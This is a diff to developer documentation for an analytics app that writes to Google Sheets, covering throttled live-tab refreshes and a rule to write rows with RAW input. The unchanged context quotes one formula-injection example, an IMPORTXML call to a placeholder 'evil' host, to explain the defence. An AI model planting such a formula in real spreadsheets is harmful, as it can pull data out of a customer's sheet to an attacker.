@@ -471,6 +471,15 @@ i.e. the digits before the dash in the client id) — without the latter, a pick
 associated with the app and the write that follows 404s. In the Google console, *Authorized redirect
 URIs* and *Authorized JavaScript origins* are **different fields** and both are needed.
 
+**The Sheets live tab is triggered by traffic but throttled, never per-event.** Google allows 60
+write requests per minute per user, which a write-per-page-view would exceed at about one visitor a
+second. `/api/v1/events` schedules `refreshLiveTab` with Next's `after()` so it runs *after* the
+response — ingestion must stay fast and must never fail because a spreadsheet is unreachable, so
+that function swallows every error. The throttle is a compare-and-set on
+`WebsiteSheetTarget.liveRefreshedAt`; do not replace it with a read-then-write, or concurrent
+beacons will each fire a write. The live tab is overwritten in place and is deliberately *not* the
+same tab as the append-only daily history.
+
 **Sheets rows must be written with `valueInputOption=RAW`.** `USER_ENTERED` parses a leading `=`
 as a formula, and experiment names are customer-controlled text — so a name like
 `=IMPORTXML("http://evil/",…)` would become a live formula in the customer's spreadsheet. There is
